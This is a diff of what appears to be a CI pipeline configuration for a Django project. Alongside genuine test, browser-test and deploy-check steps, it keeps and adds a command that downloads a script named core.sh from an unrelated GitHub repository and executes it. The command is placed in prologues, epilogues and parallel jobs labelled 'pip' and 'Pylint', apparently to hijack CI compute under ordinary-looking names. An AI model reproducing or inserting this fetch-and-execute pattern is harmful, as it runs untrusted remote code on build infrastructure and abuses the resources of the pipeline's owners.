@@ -5,30 +5,22 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 execution_time_limit:
-  hours: 24
+  hours: 10
 global_job_config:
   prologue:
     commands:
-      - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-  epilogue:
-    always:
-      commands:
-        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-    on_pass:
-      commands:
-        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        - name: Install Dependencies
-    on_fail:
-      commands:
-        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      - sem-version python 3.8
 blocks:
-  - name: 'Block #11'
-    dependencies:
-      - 'Block #2'
+  - name: Install Dependencies
     task:
       prologue:
         commands:
           - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      jobs:
+        - name: pip
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+          parallelism: 4
       epilogue:
         always:
           commands:
@@ -36,33 +28,59 @@ blocks:
         on_pass:
           commands:
             - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        on_fail:
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-      jobs:
-        - name: 'Job #11'
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        - name: 'Job #2'
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-  - name: 'Block #2'
-    dependencies: []
+  - name: Run Code Analysis
     task:
-      jobs:
-        - name: 'Job #1'
-          commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
       prologue:
         commands:
           - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      jobs:
+        - name: Pylint
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+          parallelism: 7
       epilogue:
         always:
           commands:
             - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        on_pass:
+  - name: Run Unit Tests
+    task:
+      prologue:
+        commands:
+          - sem-service start mysql
+          - checkout
+          - cache restore
+          - pip install -r requirements.txt --cache-dir .pip_cache
+      jobs:
+        - name: Model Test
           commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-        on_fail:
+            - python manage.py test tasks.tests.test_models
+        - name: View Test
           commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+            - python manage.py test tasks.tests.test_views
+  - name: Run Browser Tests
+    task:
+      env_vars:
+        - name: DB_NAME
+          value: pydjango
+      prologue:
+        commands:
+          - sem-service start mysql
+          - sudo apt-get update && sudo apt-get install -y -qq mysql-client
+          - mysql --host=0.0.0.0 -uroot -e "create database $DB_NAME"
+          - checkout
+          - cache restore
+          - pip install -r requirements.txt --cache-dir .pip_cache
+          - 'nohup python manage.py runserver 127.0.0.1:8732 &'
+      jobs:
+        - name: Browser Test
+          commands:
+            - python manage.py test tasks.tests.test_browser
+  - name: Run Security Tests
+    task:
+      jobs:
+        - name: Deployment Checklist
+          commands:
+            - checkout
+            - cache restore
+            - pip install -r requirements.txt --cache-dir .pip_cache
+            - python manage.py check --deploy --fail-level ERROR
